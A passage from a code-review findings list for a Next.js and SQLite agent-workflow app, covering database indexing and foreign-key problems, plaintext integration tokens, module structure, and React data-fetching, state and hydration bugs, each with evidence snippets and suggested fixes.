- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-22
- **Location:** `lib/db/schema.sql:150-160` (runs), `lib/db/schema.sql:20-37` (flows), `lib/db/schema.sql:113-130` (plan_steps), `lib/db/schema.sql:324-338` (step_merges), `lib/db/schema.sql:297-302` (hook_deliveries)
- **Problem:** Several queries in `lib/`/`app/` scan full tables:
  - `runs`: `WHERE node_id` (4×), `flow_id` (2×), `cursor_run_id` (`agent-runner.ts:118`, on every run start) and `status` (reconcile).
  - `flows`: `WHERE parent_flow_id`, `template_id`, `gitlab_project_id` (webhook routing), `status`, `worktree_dir`.
  - `plan_steps`: `WHERE sub_flow_id` (4×).
  - `step_merges`: `WHERE flow_id` (4×).
  - `hook_deliveries`: TTL deletes by `created_at`.

  None of these columns is indexed, so the cost grows with history on every poll tick and webhook. Separately, `comments` declares a redundant `UNIQUE(discussion_id, id)` while `id` is already the PK.
- **Evidence:**
  ```sql
  CREATE TABLE IF NOT EXISTS runs (
    id            TEXT PRIMARY KEY,
    flow_id       TEXT NOT NULL REFERENCES flows(id),
    node_id       TEXT NOT NULL REFERENCES nodes(id),
    cursor_agent_id TEXT NOT NULL,
    cursor_run_id TEXT NOT NULL,
  ```
- **Suggested fix:** Add `CREATE INDEX IF NOT EXISTS` statements for `runs(node_id)`, `runs(flow_id)`, `runs(cursor_run_id)` (UNIQUE if the semantics allow), `runs(status)`, `flows(parent_flow_id)`, `flows(gitlab_project_id)`, `flows(status)`, `plan_steps(sub_flow_id)`, `step_merges(flow_id)` and `hook_deliveries(created_at)`. This is a schema change, so ask first per AGENTS.md section 1.
- **Effort:** S

### CR-114 [Medium] Deleting a repo referenced by any flow throws an unhandled FK error (500); no foreign key declares `ON DELETE` behaviour

- **Status at `abaa007`:** **Open**, fix in [Task 34](review-tasks/34-db-row-safety.md)
- **Current location:** lib/db/index.ts:90, lib/db/index.ts:988-990, app/api/repos/[id]/route.ts:54-58, lib/db/schema.sql:20-37, lib/db/schema.sql:151-162
- **Re-verification note:** `deleteRepo` is still a bare `DELETE`, and the route calls it with no checks. Deleting a repo that any flow references throws an FK error (500), and an unknown id returns `{ok:true}`. Fix: add a `RepoService.delete` that throws `NotFoundError` or `RepoInUseError`, mapped to 404/409; longer term, add `ON DELETE` clauses (needs schema approval).

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations; Area 1 — App/API (app/, loaders/)
- **Source:** DATA-23, APP-12 (merged duplicate)
- **Related:** CR-046 (APP-10, ENG-28) — fix CR-046 first: the 404/409 mapping uses the typed errors; CR-066 (ENG-21); CR-159 (TOOL-06); CR-211 (DATA-31)
- **Location:**
  - DATA-23: `lib/db/schema.sql:22`, `lib/db/schema.sql:41`, `lib/db/schema.sql:57-58`, `lib/db/schema.sql:71`, `lib/db/schema.sql:152-153`, `lib/db/index.ts:90`, `lib/db/index.ts:970-972`
  - APP-12: `app/api/repos/[id]/route.ts:54-58`
- **Suggested fix (combined):** Short term (no schema change): add a `RepoService.delete(id)` / guarded `deleteRepo` that throws `NotFoundError` for unknown ids and a typed conflict (`RepoInUseError`) when flows reference the repo, mapped to 404/409 by the route. Long term (needs schema approval and a table rebuild): declare `ON DELETE SET NULL` for `flows.repo_id` and `CASCADE` for flow child tables, which also removes the hand-ordered child deletes.
- **Effort:** M (sources: DATA-23 M, APP-12 S)

Original findings, verbatim:

#### DATA-23 (Area 4 — DB, git, integrations): No FK `ON DELETE` behaviour, and FKs are enforced — deletes throw raw `SqliteError`s

- **Severity:** Medium
- **Category:** Correctness
- **Location:** `lib/db/schema.sql:22`, `lib/db/schema.sql:41`, `lib/db/schema.sql:57-58`, `lib/db/schema.sql:71`, `lib/db/schema.sql:152-153`, `lib/db/index.ts:90`, `lib/db/index.ts:970-972`
- **Problem:** better-sqlite3 enables `foreign_keys=1` by default (verified), but no FK declares `ON DELETE`. Consequences:
  - `Database.deleteRepo` on a repo that any flow references (`flows.repo_id REFERENCES repos(id)`) throws `SQLITE_CONSTRAINT_FOREIGNKEY`. `app/api/repos/[id]/route.ts:56` does not catch it, so the user gets a 500.
  - Every flow or template deletion must hand-order more than 10 child deletes. That ordering is business logic that belongs in the schema.
- **Evidence:**
  ```ts
  deleteRepo(id: string): void {
    this.run(`DELETE FROM repos WHERE id=?`, id);
  }
  ```
- **Suggested fix:** Decide per relationship between `ON DELETE CASCADE` and `SET NULL` (`flows.repo_id` should be `SET NULL`; child tables of `flows` `CASCADE`). This needs a table rebuild, so coordinate with the schema owner. Meanwhile, have `deleteRepo` check for references and throw a typed `RepoInUseError` that the route maps to 409.
- **Effort:** M

#### APP-12 (Area 1 — App/API (app/, loaders/)): `DELETE /api/repos/:id` returns an unhandled 500 when a flow references the repo

- **Severity:** Medium
- **Category:** Correctness
- **Location:** `app/api/repos/[id]/route.ts:54-58`
- **Problem:** `flows.repo_id REFERENCES repos(id)` (`lib/db/index.ts:90`), and better-sqlite3 enforces foreign keys by default (`PRAGMA foreign_keys` is 1, verified). Deleting any repo that has ever had a flow throws `FOREIGN KEY constraint failed` and the user gets a 500. Deleting an unknown id returns `{ok:true}`.
- **Evidence:**
  ```ts
  export async function DELETE(_req, { params }) {
    const { id } = await params;
    db.deleteRepo(id);
    return NextResponse.json({ ok: true });
  }
  ```
- **Suggested fix:** Add a `RepoService.delete(id)` that throws `NotFoundError` for unknown ids and `ConflictError` with a count when flows reference the repo (or detaches or archives them, which is a product decision). Map these to 404/409.
- **Effort:** S

### CR-115 [Medium] Row mappers bypassed: hand-written row interfaces and unvalidated `db.get/all` in the area

- **Status at `abaa007`:** **Open**, fix in [Task 34](review-tasks/34-db-row-safety.md)
- **Current location:** lib/db/index.ts:10-25, lib/db/index.ts:885-889, lib/db/index.ts:913-917, lib/db/index.ts:929-935, lib/integrations/gitlab/client.ts:5-10, lib/integrations/gitlab/client.ts:182-184, lib/integrations/jira/service.ts:5-11, lib/integrations/jira/service.ts:27-29, lib/engine/runtime/worktree-lifecycle.ts:25-34, lib/engine/runtime/worktree-lifecycle.ts:314, lib/db/rows.ts:11, lib/db/rows.ts:43, lib/db/rows.ts:175
- **Re-verification note:** These still bypass the row schemas: the hand-written `Repo` and `GitLabInstance` interfaces duplicate `RepoRow` and `GitLabInstanceRow` (the latter is still unused), `listMessages` returns `all<any>`, there are still no `JiraInstanceRow`, `WorktreeRemovalRow` or `SettingRow` schemas, `getSetting<T = any>` is still an unchecked cast, and `raw` columns stay `z.string()` despite the header comment. Fix: route these reads through `rows.get/all` with schemas, delete the duplicate interfaces, and make `getSetting` take a Zod schema.

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-24
- **Related:** CR-051 (APP-16); CR-071 (ENG-27); CR-112 (DATA-21)
- **Location:** `lib/db/index.ts:10-25`, `lib/db/index.ts:867-871`, `lib/db/index.ts:895-899`, `lib/db/index.ts:911-923`, `lib/integrations/gitlab/client.ts:5-10`, `lib/integrations/gitlab/client.ts:182-184`, `lib/integrations/jira/service.ts:5-11`, `lib/integrations/jira/service.ts:28-30`, `lib/db/rows.ts:11`, `lib/db/rows.ts:43`, `lib/db/rows.ts:175`
- **Problem:** `rows.ts` claims "rows cross the DB boundary exactly once — here", yet:
  - `Repo` duplicates `RepoRow`, and `listRepos`, `repoById` and `listMessages` (`all<any>`) skip Zod.
  - `GitLabInstance` duplicates `GitLabInstanceRow`, which is never used.
  - `jira_instances`, `settings` and `worktree_removals` (the last typed ad hoc in `engine/worktree-lifecycle.ts:25-34`) have no row schema at all.
  - `getSetting<T>` is an unchecked cast: a string-typed `local_agent.timeout_ms` would flow through as a "number".
  - The header says `raw` columns are decoded, but `TaskRow.raw` and `CommentRow.raw` stay `z.string()`.

  Schema/mapper drift is therefore undetected.
- **Evidence:**
  ```ts
  listRepos(): Repo[] {
    return this.all<Repo>(`SELECT * FROM repos ORDER BY name`);
  }
  ```
- **Suggested fix:** Route these reads through `rows.get/all` with `RepoRow`, `GitLabInstanceRow` and `MessageRow`. Add `JiraInstanceRow`, `WorktreeRemovalRow` and `SettingRow`. Delete the duplicate interfaces and re-export `z.infer` types. Make `getSetting` take a Zod schema. Fix the `raw` doc comment, or decode `raw`.
- **Effort:** M

### CR-116 [Medium] `lib/db/index.ts` is a god module: connection, migrations, data fixes, seed content and four domain stores

- **Status at `abaa007`:** **Open**, fix in [Task 48](review-tasks/48-backend-dependency-injection.md)
- **Current location:** lib/db/index.ts:34-991 (migrations and data fixes 73-585, template seed 586-845, stores 870-990)
- **Re-verification note:** `Database` is now about 1,000 lines and still owns the connection, about 12 migration and data-fix routines, the SDLC template seed and the messages, events, settings and repo stores. Many of those routines are legacy back-compat (tickets→tasks rename, `migrateLegacyTicketRefs`, the legacy SDLC `mcp_sources` fix, binding pre-template flows), so most can be deleted rather than moved, given the no-legacy policy. Fix: delete the legacy migrations, then split into `Database`, `SchemaMigrator`, `TemplateSeeder` and `lib/db/stores/*`, each registered via `processSingleton`.

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-26
- **Related:** CR-210 (DATA-30)
- **Location:** `lib/db/index.ts:34-973`
- **Problem:** One ~990-line class owns:
  - the connection lifecycle;
  - about 12 migration and data-fix routines (L73-566);
  - about 260 lines of product seed content (L571-829, with agent prompts, Slack webhook bodies and the SDLC graph);
  - the messages, events, settings and repo stores;
  - URL normalization (`normalizeRepoUrl`, which GitLab consumes).

  Business and product data lives in the persistence layer. The doc comment itself admits the stores "don't warrant their own class yet". Every new column touches this file.
- **Evidence:**
  ```ts
  /**
   * Owns the connection lifecycle, schema bootstrap and idempotent migrations,
   * plus the low-level query helpers (get/all/run) and the small domain stores
   * (messages, events, settings, repos) that don't warrant their own class yet.
   */
  export class Database {
  ```
- **Suggested fix:** Split it into the following, each constructor-injected with the connection and registered via `processSingleton`:
  - `Database` (connection plus `get/all/run/transaction`);
  - `SchemaMigrator` (ordered migrations keyed on `PRAGMA user_version`; see DATA-30 (CR-210));
  - `TemplateSeeder`, with seed data moved to `lib/engine/templates/seed.ts` or YAML fixtures;
  - `RepoStore`, `SettingsStore`, `EventStore` and `MessageStore` under `lib/db/stores/`.

  Move `normalizeRepoUrl` to a pure util.
- **Effort:** L

### CR-117 [Medium] Integration secrets stored in plaintext SQLite and read directly by integrations, bypassing `lib/config.ts`

- **Status at `abaa007`:** **Open**, fix in [Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md)
- **Current location:** lib/db/schema.sql:183-200, lib/db/schema.sql:202, lib/integrations/cursor/credentials.ts:9-16, lib/integrations/gitlab/client.ts:182-184, lib/integrations/jira/service.ts:27-29
- **Re-verification note:** GitLab PATs, Jira tokens and `settings.cursor.api_key` are still plaintext, read directly from `db` by each integration, and `SELECT *` instance listing still pulls tokens into every routing call. Fix: add a `SecretStore`, the only reader of token columns, encrypting at rest with a key from `lib/config.ts`, and project tokens out of list queries. This is an owner design decision.

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-27
- **Related:** CR-016 (NODE-03); CR-186 (ENG-37); CR-264 (TOOL-21)
- **Location:** `lib/db/schema.sql:186`, `lib/db/schema.sql:196`, `lib/integrations/cursor/credentials.ts:9-26`, `lib/integrations/gitlab/client.ts:182-191`, `lib/integrations/jira/service.ts:28-39`
- **Problem:** AGENTS.md section 1 says secrets come only from `lib/config.ts`. Instead:
  - GitLab PATs, Jira tokens and the Cursor API key (`settings.cursor.api_key`) are stored in plaintext columns.
  - Each integration fetches them straight from `db`.
  - `SELECT *` in `listInstances` pulls tokens into every routing call (`instanceForRepo` runs on every API call).

  Anyone who copies `data/*.db` (backups, bug reports, the seed scripts' DB) gets all credentials.
- **Evidence:**
  ```ts
  export function cursorApiKey(): string {
    return db.getSetting<string>("cursor.api_key", "").trim();
  }
  ```
- **Suggested fix:** Introduce a `SecretStore` class (constructor-injected db plus a key from `config`, e.g. an OS keychain or an env master key) that encrypts at rest and is the only reader of token columns. Project tokens out of list queries (`SELECT id, name, base_url`). Flag this in the PR description as a design decision for the owners.
- **Effort:** L

### CR-118 [Medium] Integrations and row gateway import the global `db` instead of taking injected dependencies

- **Status at `abaa007`:** **Open**, fix in [Task 48](review-tasks/48-backend-dependency-injection.md)
- **Current location:** lib/integrations/gitlab/client.ts:3, lib/integrations/gitlab/client.ts:176-200, lib/integrations/jira/service.ts:3, lib/integrations/jira/service.ts:25-60, lib/integrations/local-agent/agent.ts:13, lib/integrations/local-agent/agent.ts:86-94, lib/integrations/gitlab/git-host.ts:167-239, lib/db/rows.ts:4, lib/db/rows.ts:413-430
- **Re-verification note:** `GitLabService`, `JiraService`, `LocalAgentService` and `RowGateway` still import the module-level `db`, and `GitLabHostService` still calls the module-level `gitLab`. The instance-table SQL still lives inside the HTTP integration classes. Fix: extract `GitLabInstanceStore` and `JiraInstanceStore`, then constructor-inject the stores, `GitLabService` and `Database`, wired in the singletons.

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-28
- **Location:** `lib/integrations/gitlab/client.ts:3`, `lib/integrations/gitlab/client.ts:176-325`, `lib/integrations/jira/service.ts:3`, `lib/integrations/jira/service.ts:25-97`, `lib/integrations/local-agent/agent.ts:13`, `lib/integrations/local-agent/agent.ts:86-95`, `lib/integrations/gitlab/git-host.ts:167-186`, `lib/db/rows.ts:4`, `lib/db/rows.ts:409-429`
- **Problem:** AGENTS.md section 3.1 requires constructor-injected private deps. `GitLabService`, `JiraService`, `LocalAgentService` and `RowGateway` reach for the module-level `db`. `GitLabHostService` reaches for the module-level `gitLab`. The SQL for `gitlab_instances` and `jira_instances` also lives inside the HTTP integration classes, mixing persistence with transport. This makes them untestable without a real DB file.
- **Evidence:**
  ```ts
  export class GitLabService {
    ...
    listInstances(): GitLabInstance[] {
      return db.all<GitLabInstance>(`SELECT * FROM gitlab_instances ORDER BY base_url`);
    }
  ```
- **Suggested fix:** Extract `GitLabInstanceStore` and `JiraInstanceStore` into `lib/db/stores/`. Inject them into `GitLabService`/`JiraService` constructors, inject `GitLabService` into `GitLabHostService`, and inject `Database` into `RowGateway`. Wire them in the existing singletons.
- **Effort:** M

### CR-119 [Medium] Initial event history loads oldest-first, 200 per 3 s poll, and each page invalidates the flow snapshot

- **Status at `abaa007`:** **Fixed** ([Task 30](review-tasks/30-events-feed.md) — `?tail=` initial load, `caughtUp` before flow-detail invalidation)

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-04
- **Related:** CR-108 (APP-19, DATA-17)
- **Location:** `components/flows/cockpit/hooks/use-flow-events.ts:25-36`, `components/flows/cockpit/FlowCockpit.tsx:49-53`. Contract: `app/api/flows/[id]/events/route.ts:14-18`
- **Problem:** The route defaults to `LIMIT 200 … ORDER BY created_at, id` after the cursor. The hook starts at `after=""` and only advances once per `refetchInterval` (3 s). A flow with 2,000 events takes about 30 s to catch up. Until then:
  - the chat feed and `BuildView`'s `mrErrorFor` read stale, oldest-first history, and the newest activity (which the user came to see) is missing.
  - every page changes `lastEventId`, which triggers another `invalidateQueries(flows.detail)` and refetches the whole flow snapshot about 10 times in a row.
- **Evidence:**
  ```ts
  `/api/flows/${flowId}/events?after=${encodeURIComponent(cursor.current)}`  // no limit, no tail mode
  refetchInterval: EVENTS_REFETCH_MS,
  ```
- **Suggested fix:** On the first fetch, request the tail (for example `?tail=500`, or a `before`/`desc` variant) so the window starts at the newest `EVENTS_BUFFER_MAX` events. Alternatively, keep fetching immediately while a page comes back full (`fresh.length === limit`). Only invalidate the flow detail when the poll is caught up.
- **Effort:** M

### CR-120 [Medium] `ArtifactLoader` fetches in a raw `useEffect` with no error path: rejections hang on "Loading…" and stale content shows on id change

- **Status at `abaa007`:** **Fixed** ([Task 13](review-tasks/13-frontend-query-ownership.md))
- **Current location:** components/flows/panels/ArtifactViews.tsx:102-123 (consumers: ArtifactViews.tsx:37, AgentView.tsx:98, HttpView.tsx:60, ScriptView.tsx:63, BuildView.tsx:189), components/flows/panels/context.ts:25
- **Re-verification note:** `ArtifactLoader` is still a raw `useEffect` + `useState` fetch with no `.catch`, so a failure hangs on "Loading…" forever, the previous artifact stays on screen when `id` changes, and loading is a bare spinner. The plan panel no longer uses it (`MasterPlanSection` has its own `useQuery` with skeleton, error and retry), but every other panel does. Fix: add a `useArtifact(id)` `useQuery` hook (`staleTime: Infinity`) with skeleton, error-with-retry and content states, then drop `fetchArtifact` from the panel context.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-05
- **Related:** CR-121 (FLOWUI-06)
- **Location:** `components/flows/panels/ArtifactViews.tsx:63-85`. Used by `AgentView.tsx:100`, `HttpView.tsx:59`, `ScriptView.tsx:62`, `BuildView.tsx:167`, `plan/MainPlanSection.tsx:27`
- **Problem:**
  - **No error state.** `fetchArtifact(id).then(...)` has no `.catch`. A network failure is an unhandled rejection, and the panel shows "Loading…" forever with no retry (§2.8).
  - **Stale content.** When `id` changes (a new version arrives or another tab is picked), `art` isn't reset, so the previous artifact's content stays on screen under the new version until the fetch resolves.
  - **Wrong loading UI.** Loading is a bare inline spinner where the layout is known (markdown card, diff, `<pre>`).
  - **Convention.** This is the `useEffect + useState` fetch pattern §2.1 forbids.
- **Evidence:**
  ```tsx
  const [art, setArt] = useState<ArtifactPayload | null>(null);
  useEffect(() => {
    let live = true;
    fetchArtifact(id).then((value) => { if (live) setArt(value as ArtifactPayload); });
    return () => { live = false; };
  }, [id, fetchArtifact]);
  if (!art) return <p className="text-muted-foreground"><Spinner /> Loading…</p>;
  ```
- **Suggested fix:**
  1. Replace this with a `useArtifact(id)` hook on `useQuery({ queryKey: queryKeys.artifacts.detail(id), queryFn: fetchJson, staleTime: Infinity })`. Artifacts are immutable per id.
  2. Render an artifact skeleton (pre/markdown block), an error message with retry, and the content.
  3. Remove `fetchArtifact` from `PanelProps` once every panel uses the hook.
- **Effort:** M

### CR-121 [Medium] `useArtifactFetcher` caches HTTP error bodies as artifacts and its "cache" never hits

- **Status at `abaa007`:** **Fixed** ([Task 13](review-tasks/13-frontend-query-ownership.md))
- **Current location:** hooks/use-artifact-fetcher.ts:14-28, components/flows/components/plan/components/masterPlanSection/MasterPlanSection.tsx:31-38
- **Re-verification note:** `useArtifactFetcher` still returns `res.json()` regardless of status, so error bodies are cached as artifacts, and it uses `fetchQuery` with the default `staleTime: 0`, so the cache never hits. `MasterPlanSection` now writes the same `queryKeys.artifacts.detail(id)` key with a throwing `queryFn`, so two different semantics share one key. Fix: one shared `artifactQueryOptions(id)` using `fetchJson` with `staleTime: Infinity`, used by both, ideally inside the CR-120 hook.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-06
- **Related:** CR-120 (FLOWUI-05)
- **Location:** `hooks/use-artifact-fetcher.ts:15-28`
- **Problem:**
  - **Errors become content.** The `queryFn` returns `res.json()` regardless of status. A 404 or 500 `{ error }` body gets cached under `artifacts.detail(id)` and rendered as an artifact with `content: undefined`, which shows an empty `<pre>` or markdown with no error.
  - **No caching.** `fetchQuery` with the default `staleTime: 0` refetches on every call, so the docstring's claim that "reopening the same artifact hits the cache" is false. Every panel re-render that changes `id` hits the network. With no observers, entries are also garbage-collected after 5 minutes.
- **Evidence:**
  ```ts
  queryClient.fetchQuery({
    queryKey: queryKeys.artifacts.detail(id),
    queryFn: async () => { const res = await fetch(`/api/artifacts/${id}`); return (await res.json()) as Artifact; },
  }),
  ```
- **Suggested fix:** Use `fetchJson` so non-OK responses throw, and pass `staleTime: Infinity`, since artifact rows are immutable by id. Better still, fold this into the `useArtifact` query hook from FLOWUI-05 (CR-120).
- **Effort:** S

### CR-122 [Medium] DecisionView seeds its pick from props once, so a proposal that arrives later is never preselected

- **Status at `abaa007`:** **Fixed** (Task 35)
- **Current location:** components/flows/panels/DecisionView.tsx:28-30, components/flows/panels/DecisionView.tsx:39-44, components/flows/panels/DecisionView.tsx:60-69
- **Re-verification note:** `useState<string[]>(proposed)` still captures `out.chosen` only at mount, so a proposal that arrives by polling is never preselected and the "Confirm" button never shows. Fix: hold only the user's override (`useState<string[] | null>(null)`) and derive `override ?? proposed` during render.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-07
- **Location:** `components/flows/panels/DecisionView.tsx:27-29,43,59-66`
- **Problem:** `useState<string[]>(proposed)` captures `node.output.chosen` only at mount. If the panel is open while the decision node runs, `proposed` is `[]` at mount. When polling delivers `awaiting_approval` with an agent or expression pick, `sel` stays `[]`:
  - `samePick` is false, so the "Confirm <pick>" button never renders.
  - The user sees a disabled "Take branch" and nothing preselected, which contradicts the footer text ("The proposed branch is pre-selected").
- **Evidence:**
  ```tsx
  const proposed = out.chosen ?? [];
  const [sel, setSel] = useState<string[]>(proposed);
  ...
  const samePick = sel.length === proposed.length && sel.every((l) => proposed.includes(l));
  ```
- **Suggested fix:** Store only the user's override (`useState<string[] | null>(null)`) and derive `const effective = override ?? proposed` during render (§2.6). Alternatively, key the view by `node.node_key + proposed.join()`.
- **Effort:** S

### CR-123 [Medium] AgentView version tabs do nothing when clicked

- **Status at `abaa007`:** **Fixed** (Task 35)
- **Current location:** components/flows/panels/AgentView.tsx:37-38, components/flows/panels/AgentView.tsx:92-102
- **Re-verification note:** `VersionTabs` still gets `sel={latest.id}` and `onSel={() => {}}`, and the loader always renders `latest`, so earlier versions can't be viewed. Fix: add `selId` state with `current = mdArts.find(a => a.id === selId) ?? latest` (the same as `GenericArtifact`), or reuse `GenericArtifact` with a custom renderer.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-08
- **Location:** `components/flows/panels/AgentView.tsx:39-40,99-100`
- **Problem:** `VersionTabs` gets `onSel={() => {}}` and `sel={latest.id}`, and the loader always renders `latest`. When an agent node has several output versions, the tab bar renders but every tab except the latest is dead. Users can't view earlier outputs, unlike `GenericArtifact` and `PlanView`, which wire selection.
- **Evidence:**
  ```tsx
  const latest = mdArts[mdArts.length - 1];
  {mdArts.length > 1 && <VersionTabs arts={mdArts} sel={latest.id} onSel={() => {}} className="mb-3.5" />}
  <ArtifactLoader id={latest.id} ... />
  ```
- **Suggested fix:** Add `const [selId, setSelId] = useState<string | null>(null)` and `current = mdArts.find(a => a.id === selId) ?? latest`. Pass `setSelId` and `current.id`, or reuse `GenericArtifact` with a custom renderer.
- **Effort:** S

### CR-124 [Medium] ChatPanel state carries over between nodes (draft, refine toggle, prompt box, send error)

- **Status at `abaa007`:** **Fixed** (Task 35)
- **Current location:** components/flows/panels/NodePanel.tsx:46-70, components/flows/panels/NodeChat.tsx:17-29, components/chat/components/chatComposerForm/ChatComposerForm.tsx:80
- **Re-verification note:** The refine toggle and `NodePromptBox` are gone, and the chat panel no longer renders the send error. But the rail and panel are still not keyed by node: `ChatComposerForm`'s `useState(initialDraft)` draft survives a switch between two nodes using the same `NodeChat`, and is then sent to the new node. Panel-local state (for example `DecisionView` `sel` and `AgentView` dialogs) also carries over between same-kind nodes. Fix: render `<NodePanel key={node.node_key} …>` in `FlowCockpit`, or key `<Panel/>` and `<Chat/>` inside `NodePanel`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-09
- **Location:** `components/flows/cockpit/FlowCockpit.tsx:192-208`, `components/chat/ChatPanel.tsx:61-68,83-84`, `components/chat/hooks/use-chat-composer.ts:32-36,45-49`
- **Problem:** `<ChatPanel>` stays mounted while `nodeKey` changes, so several pieces of state follow the user to the new node:
  - **Draft.** The unsent draft typed for node A becomes a message to node B.
  - **Refine toggle.** If B is refinable, the message regenerates B's output, a destructive run the user didn't opt into for B.
  - **UI state.** `promptOpen`/`promptEditing` carry over too.
  - **Stale error.** A failed send's `sendError` (mutation state) stays on screen under node B.
- **Evidence:**
  ```tsx
  <ChatPanel flowId={flow.id} nodeKey={node?.node_key ?? ""} ... />   // no key
  const [draft, setDraft] = React.useState("");
  const [refine, setRefine] = React.useState(false);
  ```
- **Suggested fix:** Render `<ChatPanel key={node?.node_key ?? ""} …>` in FlowCockpit. If a shared draft is wanted, lift only the draft, and still reset `refine` and `sendChat.reset()` when the node changes.
- **Effort:** S

### CR-125 [Medium] Plan "Edit prompt" first run ignores the Decompose toggle (uses `start_plan`, while the chat path uses `run_node` with `decompose`)

- **Status at `abaa007`:** **Fixed**
- **Re-verification note:** The plan panel was rewritten (`components/flows/components/plan/`). The "Edit prompt" / `start_plan` path no longer exists, and every plan run or refine goes through the chat rail's `POST /chat`. The Decompose toggle is no longer rendered, so the two entry points can't diverge. `PlanOptionToggles` is still exported but unused and can be deleted.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-10
- **Location:** `components/flows/plan/PlanView.tsx:78-84,88-99`, compared with `components/flows/cockpit/FlowCockpit.tsx:110-126`
- **Problem:** There are two UI entry points for a plan's first run:
  - The chat prompt box and modal call `startNode`, which sends `run_node` with `decompose` and `complex` from `planOptions`.
  - PlanView's header "Edit prompt" calls `startPlan`, which sends `start_plan` with only `complex`.

  The Decompose toggle shows as on in the composer but is silently dropped on the PlanView path. The two paths also hit different engine actions for the same operation.
- **Evidence:**
  ```ts
  const startPlan = (prompt?: string, promptIsBody?: boolean) =>
    action(PLAN_ACTION.START, { prompt, promptIsBody: promptIsBody || undefined,
      model: model || undefined, complex: planOptions.complex || undefined });   // no decompose
  ```
- **Suggested fix:** Route PlanView's first run through the same start callback as the chat panel (pass `onStartNode` via `PanelProps`, or build the same `run_node` payload), or at least include `decompose: planOptions.decompose`.
- **Effort:** S

### CR-126 [Medium] Prompt previews go stale after a node-config save, and the modal never re-seeds from a fresh refetch

- **Status at `abaa007`:** **Fixed** ([Task 15](review-tasks/15-frontend-mutation-conventions.md))
- **Current location:** components/flows/panels/AgentView.tsx:136-141, components/flows/cockpit/FlowCockpit.tsx:65-72, hooks/use-flow-prompt.ts:100-116, hooks/use-flow-prompt.ts:153-160
- **Re-verification note:** AgentView's Configure save still goes through the cockpit `action`, which only invalidates `flows.detail`, not `promptScope`, `prompts` or `nodePrompt`. `useFlowPrompt` still seeds once per open session from cached data through an effect, so a fresher refetch is ignored. Even the rules save only invalidates `promptScope`, not `prompts` or `nodePrompt`. Fix: invalidate all three prompt key families after `set_node_config`, and derive `edited ?? baseQuery.data.prompt` during render instead of seeding from an effect.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-11
- **Related:** CR-004 (APP-04); CR-027 (FLOWUI-02)
- **Location:** `components/flows/panels/AgentView.tsx:140-143`, `components/flows/cockpit/FlowCockpit.tsx:102`, `hooks/use-flow-prompt.ts:120-150`, `hooks/use-flow-chat.ts:39-54`
- **Problem:**
  - **Missing invalidation.** `set_node_config`, sent from AgentView's Configure dialog through the cockpit `action`, only invalidates `flows.detail`. It doesn't invalidate `flows.promptScope(flowId)` or `flows.nodePrompt(flowId, key)`.
  - **Stale seed.** On reopen, `useFlowPrompt` returns the cached (stale) `baseQuery.data` immediately and seeds the editor with it (`seededRef = seedIdentity`). When the mount refetch delivers the new body, the seed guard blocks re-seeding, so the user edits and runs the old prompt.
  - **First-frame flash.** Because the seed is an effect copying query data into state, the first frame after load shows an empty editor with the Run button disabled.
- **Evidence:**
  ```ts
  useEffect(() => {
    if (!open || !baseQuery.data) return;
    if (seededRef.current === seedIdentity) return;   // a later fresh refetch is ignored
    seededRef.current = seedIdentity;
    setEdited(baseQuery.data.prompt ?? "");
  ```
- **Suggested fix:**
  1. Invalidate `["flows","prompt",flowId]` and `["flows","node-prompt",flowId]` after `set_node_config`, using the mutation from FLOWUI-02 (CR-027).
  2. Seed only from non-stale data: wait for `!baseQuery.isFetching` on the first seed of an open session, or use `refetchOnMount: "always"` plus `isFetchedAfterMount`.
  3. Better, keep `edited: string | null` and derive `edited ?? baseQuery.data.prompt` during render, so no effect is needed.
- **Effort:** M

### CR-127 [Medium] Hydration mismatches: `window.location.origin` and `Date.now()`/`toLocaleTimeString` in SSR'd panel render

- **Status at `abaa007`:** **Fixed** (Task 35)
- **Current location:** components/flows/panels/PanelShell.tsx:106-125, components/flows/panels/ResolveView.tsx:21-26
- **Re-verification note:** `WaitBanner` still reads `window.location.origin` during render (empty on the server), and `ResolveView` still calls `Date.now()` and `toLocaleTimeString` during render. The cockpit is server-rendered with `initialFlow`, so both cause hydration mismatches. Fix: render a relative `/api/hooks/<id>` path and build the absolute URL only in the copy handler; format the time client-side after mount (a `useSyncExternalStore`/`useIsClient` hook).

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-12
- **Location:** `components/flows/panels/PanelShell.tsx:107-108,117,123-125`, `components/flows/panels/ResolveView.tsx:20-25`
- **Problem:** FlowCockpit is server-rendered with `initialFlow`, and the selected node's panel renders on the server.
  - **WaitBanner** renders `base = ""` on the server and the real origin on the client, so the `POST to …/api/hooks/<id>` text differs.
  - **ResolveView** computes `scheduledAt > Date.now()` and formats with the server's timezone and locale, which differ from the browser's.

  Both produce React hydration errors, and the subtree is re-rendered client-side when a waiting or resolve node is selected on first paint.
- **Evidence:**
  ```tsx
  const base = typeof window !== "undefined" ? window.location.origin : "";
  ...
  : scheduledAt > Date.now()
    ? new Date(scheduledAt).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", hour12: false })
  ```
